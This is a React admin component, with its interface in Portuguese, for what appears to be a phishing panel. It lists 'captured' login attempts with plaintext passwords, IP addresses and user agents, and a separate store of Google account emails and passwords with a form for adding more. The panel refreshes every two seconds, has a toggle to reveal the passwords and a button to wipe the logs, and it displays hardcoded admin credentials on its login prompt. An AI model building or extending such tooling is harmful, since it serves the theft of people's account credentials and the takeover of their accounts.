import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import { Eye, EyeOff, Clock, User, Shield, Trash2, Plus } from "lucide-react";
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { getCurrentUser } from "@/lib/auth";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import GoogleDataModal from "@/components/google-data-modal";

interface LoginAttempt {
  id: string;
  email: string;
  password: string;
  timestamp: string;
  success: boolean;
  userAgent?: string;
  ip?: string;
}

interface GoogleDataLog {
  id: string;
  googleEmail: string;
  googlePassword: string;
  timestamp: string;
  submittedBy: string;
  userAgent?: string;
  ip?: string;
  notes?: string;
}

export default function AdminLogsSection() {
  const [showPasswords, setShowPasswords] = useState(false);
  const [googleModalOpen, setGoogleModalOpen] = useState(false);
  const currentUser = getCurrentUser();
  const { toast } = useToast();
  
  // Debug: verificar usuário logado
  console.log('👤 Usuário atual:', currentUser?.email, '| Admin:', (currentUser as any)?.isAdmin);

  const { data: logs, isLoading, error, refetch } = useQuery({
    queryKey: ["/api/admin/login-logs", currentUser?.id],
    queryFn: async () => {
      console.log('🔍 Buscando logs para usuário:', currentUser?.id);
      const params = new URLSearchParams({ 
        userId: currentUser?.id || '',
        _t: Date.now().toString() // Timestamp para evitar cache
      });
      const url = `/api/admin/login-logs?${params}`;
      console.log('🌐 URL da requisição:', url);
      
      // Usar apiRequest que já configura a URL base correta para Netlify
      const response = await apiRequest('GET', url);
      
      console.log('📡 Response recebida');
      
      const data = await response.json();
      console.log('📊 Dados recebidos do servidor:', JSON.stringify(data, null, 2));
      console.log('📝 Número de logs recebidos:', data?.length || 0);
      
      return data;
    },
    enabled: !!(currentUser?.id && (currentUser as any)?.isAdmin),
    refetchInterval: 2000, // Atualiza a cada 2 segundos
    staleTime: 0,
    gcTime: 0,
    refetchOnWindowFocus: true,
    refetchOnMount: true
  });

  const { data: googleLogs, isLoading: googleLoading, refetch: refetchGoogle } = useQuery({
    queryKey: ["/api/admin/google-data", currentUser?.id],
    queryFn: async () => {
      console.log('🔍 Buscando dados do Google para usuário:', currentUser?.id);
      const params = new URLSearchParams({ 
        userId: currentUser?.id || '',
        _t: Date.now().toString()
      });
      const url = `/api/admin/google-data?${params}`;
      console.log('🌐 URL da requisição Google:', url);
      
      const response = await apiRequest('GET', url);
      const data = await response.json();
      console.log('📊 Dados do Google recebidos:', data?.length || 0);
      
      return data;
    },
    enabled: !!(currentUser?.id && (currentUser as any)?.isAdmin),
    refetchInterval: 2000,
    staleTime: 0,
    gcTime: 0,
    refetchOnWindowFocus: true,
    refetchOnMount: true
  });

  // Mutação para limpar logs
  const clearLogsMutation = useMutation({
    mutationFn: async () => {
      const params = new URLSearchParams({ 
        userId: currentUser?.id || '',
        _t: Date.now().toString()
      });
      const url = `/api/admin/login-logs?${params}`;
      
      const response = await apiRequest('DELETE', url);
      
      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || 'Erro ao limpar logs');
      }
      
      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Logs limpos!",
        description: "Todos os logs de tentativas de login foram removidos.",
      });
      // Invalidar cache para recarregar a lista
      queryClient.invalidateQueries({ queryKey: ["/api/admin/login-logs"] });
    },
    onError: (error: Error) => {
      toast({
        title: "Erro ao limpar logs",
        description: error.message,
        variant: "destructive",
      });
    }
  });

  // Mutação para limpar dados do Google
  const clearGoogleDataMutation = useMutation({
    mutationFn: async () => {
      const params = new URLSearchParams({ 
        userId: currentUser?.id || '',
        _t: Date.now().toString()
      });
      const url = `/api/admin/google-data?${params}`;
      
      const response = await apiRequest('DELETE', url);
      
      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || 'Erro ao limpar dados do Google');
      }
      
      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Dados do Google limpos!",
        description: "Todos os dados do Google foram removidos.",
      });
      // Invalidar cache para recarregar a lista
      queryClient.invalidateQueries({ queryKey: ["/api/admin/google-data"] });
    },
    onError: (error: Error) => {
      toast({
        title: "Erro ao limpar dados do Google",
        description: error.message,
        variant: "destructive",
      });
    }
  });

  // Verificar se o usuário está logado e é admin
  if (!currentUser) {
    return (
      <div className="flex flex-col items-center justify-center py-12">
        <Shield className="h-16 w-16 text-orange-500 mb-4" />
        <h3 className="text-xl font-semibold text-card-foreground mb-2">
          Login Necessário
        </h3>
        <p className="text-muted-foreground text-center">
          Você precisa fazer login como administrador para acessar os logs.
          <br />
          <span className="text-sm mt-2 block font-mono bg-muted px-2 py-1 rounded">
            admin@gmail.com / 123456
          </span>
        </p>
      </div>
    );
  }

  if (!(currentUser as any)?.isAdmin) {
    return (
      <div className="flex flex-col items-center justify-center py-12">
        <Shield className="h-16 w-16 text-red-500 mb-4" />
        <h3 className="text-xl font-semibold text-card-foreground mb-2">
          Acesso Negado
        </h3>
        <p className="text-muted-foreground text-center">
          Apenas administradores podem acessar os logs de login.
          <br />
          <span className="text-sm mt-2 block">
            Usuário atual: {currentUser?.email}
          </span>
        </p>
      </div>
    );
  }

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return date.toLocaleString("pt-BR");
  };

  const getStatusBadge = (success: boolean) => {
    return success ? (
      <Badge className="bg-green-500/10 text-green-600" data-testid="badge-success">
        Sucesso
      </Badge>
    ) : (
      <Badge variant="destructive" data-testid="badge-failed">
        Falhou
      </Badge>
    );
  };

  const truncatePassword = (password: string) => {
    if (!showPasswords) {
      return "••••••••";
    }
    return password;
  };

  if (error) {
    console.error('Error fetching logs:', error);
    return (
      <div className="flex flex-col items-center justify-center py-12">
        <Shield className="h-16 w-16 text-red-500 mb-4" />
        <h3 className="text-xl font-semibold text-card-foreground mb-2">
          Erro ao Carregar Logs
        </h3>
        <p className="text-muted-foreground text-center">
          Erro: {error?.message || 'Erro desconhecido'}
        </p>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="space-y-6">
        <div className="animate-pulse">
          <div className="h-8 bg-muted rounded mb-6"></div>
          <div className="space-y-4">
            {[...Array(5)].map((_, i) => (
              <Skeleton key={i} className="h-20 w-full" />
            ))}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div className="flex items-center space-x-3">
          <div className="w-10 h-10 bg-red-500/10 rounded-lg flex items-center justify-center">
            <Shield className="text-red-500 h-5 w-5" />
          </div>
          <div>
            <h3 className="text-xl font-semibold text-card-foreground" data-testid="text-logs-title">
              Logs de Login
            </h3>
            <p className="text-sm text-muted-foreground">
              Todas as tentativas de login capturadas
            </p>
          </div>
        </div>
        <div className="flex gap-2">
          <Button
            variant="default"
            onClick={() => setGoogleModalOpen(true)}
            data-testid="button-add-google-data"
            className="bg-blue-600 hover:bg-blue-700"
          >
            <Plus className="mr-2 h-4 w-4" />
            Adicionar Dados Google
          </Button>
          <Button
            variant="outline"
            onClick={() => {
              console.log('🔄 Forçando refresh manual dos logs');
              refetch();
            }}
            data-testid="button-refresh-logs"
          >
            <Clock className="mr-2 h-4 w-4" />
            Atualizar
          </Button>
          <Button
            variant="outline"
            onClick={() => setShowPasswords(!showPasswords)}
            data-testid="button-toggle-passwords"
          >
            {showPasswords ? (
              <>
                <EyeOff className="mr-2 h-4 w-4" />
                Ocultar Senhas
              </>
            ) : (
              <>
                <Eye className="mr-2 h-4 w-4" />
                Mostrar Senhas
              </>
            )}
          </Button>
          <Button
            variant="destructive"
            onClick={() => clearLogsMutation.mutate()}
            disabled={clearLogsMutation.isPending || (logs as LoginAttempt[])?.length === 0}
            data-testid="button-clear-logs"
          >
            {clearLogsMutation.isPending ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-current mr-2"></div>
                Limpando...
              </>
            ) : (
              <>
                <Trash2 className="mr-2 h-4 w-4" />
                Limpar Logs
              </>
            )}
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <Card data-testid="card-login-logs">
          <CardHeader>
            <CardTitle className="flex items-center justify-between">
              <span>Tentativas de Login Recentes</span>
              <div className="flex items-center gap-2">
                {isLoading && (
                  <div className="flex items-center gap-1 text-sm text-muted-foreground">
                    <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-primary"></div>
                    Carregando...
                  </div>
                )}
                <Badge variant="secondary" data-testid="badge-total-logs">
                  {(logs as LoginAttempt[])?.length || 0} registros
                </Badge>
              </div>
            </CardTitle>
          </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {(logs as LoginAttempt[])?.length > 0 ? (
              (logs as LoginAttempt[]).map((log, index) => (
                <div
                  key={log.id}
                  className="flex items-center justify-between p-4 bg-muted rounded-lg"
                  data-testid={`log-entry-${index}`}
                >
                  <div className="flex items-center space-x-4 flex-1">
                    <div className={`w-10 h-10 ${log.success ? "bg-green-500/10" : "bg-red-500/10"} rounded-lg flex items-center justify-center`}>
                      <User className={`${log.success ? "text-green-500" : "text-red-500"} h-5 w-5`} />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center space-x-3 mb-1">
                        <p className="font-medium text-card-foreground" data-testid={`log-email-${index}`}>
                          {log.email}
                        </p>
                        {getStatusBadge(log.success)}
                      </div>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-2 text-sm text-muted-foreground">
                        <div className="flex items-center space-x-1">
                          <span className="font-medium">Senha:</span>
                          <span className="font-mono bg-background px-2 py-1 rounded" data-testid={`log-password-${index}`}>
                            {truncatePassword(log.password)}
                          </span>
                        </div>
                        <div className="flex items-center space-x-1">
                          <Clock className="h-3 w-3" />
                          <span data-testid={`log-timestamp-${index}`}>
                            {formatDate(log.timestamp)}
                          </span>
                        </div>
                        <div className="flex items-center space-x-1 truncate">
                          <span className="font-medium">IP:</span>
                          <span data-testid={`log-ip-${index}`}>
                            {log.ip || "N/A"}
                          </span>
                        </div>
                      </div>
                      {log.userAgent && (
                        <div className="mt-1 text-xs text-muted-foreground truncate">
                          <span className="font-medium">User-Agent:</span> {log.userAgent}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              ))
            ) : (
              <div className="text-center py-8">
                <Shield className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
                <p className="text-muted-foreground" data-testid="text-no-logs">
                  Nenhuma tentativa de login registrada ainda
                </p>
              </div>
            )}
          </div>
        </CardContent>
        </Card>

        <Card data-testid="card-google-data">
          <CardHeader>
            <CardTitle className="flex items-center justify-between">
              <span>Dados do Google Salvos</span>
              <div className="flex items-center gap-2">
                {googleLoading && (
                  <div className="flex items-center gap-1 text-sm text-muted-foreground">
                    <div className="animate-spin rounded-full h-3 w-3 border-b-2 border-primary"></div>
                    Carregando...
                  </div>
                )}
                <Badge variant="secondary" data-testid="badge-total-google-data">
                  {(googleLogs as GoogleDataLog[])?.length || 0} registros
                </Badge>
              </div>
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {(googleLogs as GoogleDataLog[])?.length > 0 ? (
                (googleLogs as GoogleDataLog[]).map((log, index) => (
                  <div
                    key={log.id}
                    className="flex items-center justify-between p-4 bg-muted rounded-lg"
                    data-testid={`google-entry-${index}`}
                  >
                    <div className="flex items-center space-x-4 flex-1">
                      <div className="w-10 h-10 bg-blue-500/10 rounded-lg flex items-center justify-center">
                        <svg className="w-5 h-5 text-blue-500" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                          <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                          <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                          <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                        </svg>
                      </div>
                      <div className="flex-1">
                        <div className="flex items-center space-x-3 mb-1">
                          <p className="font-medium text-card-foreground" data-testid={`google-email-${index}`}>
                            {log.googleEmail}
                          </p>
                          <Badge className="bg-blue-500/10 text-blue-600" data-testid="badge-google">
                            Google
                          </Badge>
                        </div>
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-2 text-sm text-muted-foreground">
                          <div className="flex items-center space-x-1">
                            <span className="font-medium">Senha:</span>
                            <span className="font-mono bg-background px-2 py-1 rounded" data-testid={`google-password-${index}`}>
                              {showPasswords ? log.googlePassword : "••••••••"}
                            </span>
                          </div>
                          <div className="flex items-center space-x-1">
                            <Clock className="h-3 w-3" />
                            <span data-testid={`google-timestamp-${index}`}>
                              {formatDate(log.timestamp)}
                            </span>
                          </div>
                          <div className="flex items-center space-x-1 truncate">
                            <span className="font-medium">IP:</span>
                            <span data-testid={`google-ip-${index}`}>
                              {log.ip || "N/A"}
                            </span>
                          </div>
                        </div>
                        {log.notes && (
                          <div className="mt-1 text-xs text-muted-foreground">
                            <span className="font-medium">Observações:</span> {log.notes}
                          </div>
                        )}
                        {log.userAgent && (
                          <div className="mt-1 text-xs text-muted-foreground truncate">
                            <span className="font-medium">User-Agent:</span> {log.userAgent}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                ))
              ) : (
                <div className="text-center py-8">
                  <svg className="mx-auto h-12 w-12 text-muted-foreground mb-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                  </svg>
                  <p className="text-muted-foreground" data-testid="text-no-google-data">
                    Nenhum dado do Google registrado ainda
                  </p>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>

      <GoogleDataModal 
        open={googleModalOpen} 
        onOpenChange={setGoogleModalOpen} 
      />
    </div>
  );
}